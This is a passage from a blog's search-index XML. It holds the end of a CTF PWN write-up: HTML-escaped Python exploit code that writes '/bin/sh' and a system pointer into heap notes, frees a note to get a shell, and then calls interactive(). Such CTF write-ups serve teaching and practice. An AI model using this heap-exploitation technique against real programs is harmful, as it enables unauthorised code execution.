class="string">&#x27;0&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">############# GET SHELL #############<span class="meta">#</span></span><br><span class="line"><span class="meta">payload = system</span></span><br><span class="line">add_note(p,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add_note(p,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,p64(payload))</span><br><span class="line"></span><br><span class="line">remove_note(p,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
